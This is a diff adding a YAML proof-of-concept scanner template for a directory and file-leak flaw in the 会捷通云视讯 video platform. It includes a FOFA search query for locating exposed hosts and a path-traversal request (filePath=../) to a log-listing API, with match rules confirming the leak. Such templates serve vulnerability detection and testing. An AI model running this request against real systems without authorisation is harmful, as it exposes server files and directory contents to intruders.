@@ -1,0 +1,15 @@
+id: poc-yaml-hui-jie-tong-list-directory-file-leak
+info:
+  name: 会捷通云视讯 list 目录文件泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 会捷通云视讯
+  fofa: body=/him/api/rest/v1.0/node/role
+requests:
+- method: GET
+  path: /him/api/rest/V1.0/system/log/list?filePath=../
+  expression: status_code == 200 && contains(body, "/var/logs") && contains(body,
+    "\"name\":\"root\"")
+variables: {}
+transport: http
